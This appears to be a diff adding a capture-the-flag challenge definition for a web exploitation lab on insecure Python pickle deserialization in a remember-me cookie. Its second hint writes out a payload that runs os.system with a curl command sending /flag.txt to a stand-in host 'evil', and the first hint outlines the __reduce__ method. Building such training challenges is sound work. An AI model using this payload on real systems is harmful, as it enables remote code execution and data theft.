@@ -1,0 +1,24 @@
+{
+  "title": "Insecure Deserialization",
+  "slug": "insecure-deserialization",
+  "description": "DiaryBox's remember-me cookie is a base64 Python pickle. Forge a payload that executes code on the server and exfiltrate /flag.txt.",
+  "category": "Web Exploitation",
+  "team": "red",
+  "difficulty": 3,
+  "points": 400,
+  "flag": "CTF{REDACTED}",
+  "hints": [
+    {
+      "text": "pickle.loads on attacker-controlled bytes is RCE by design — implement __reduce__ on a class you pickle, set the cookie, hit the app.",
+      "cost": 50
+    },
+    {
+      "text": "Your __reduce__ can return (os.system, ('curl -s evil/$(cat /flag.txt)',)) — or simpler, write the flag to a file the app already exposes and read it back via /whoami once the unpickle ran.",
+      "cost": 100
+    }
+  ],
+  "skills": ["Insecure Deserialization", "Python", "Pickle", "RCE"],
+  "mitre_techniques": ["T1190", "T1059.006"],
+  "docker_image": "siege/insecure-deserialization:latest",
+  "docker_port": 5000
+}
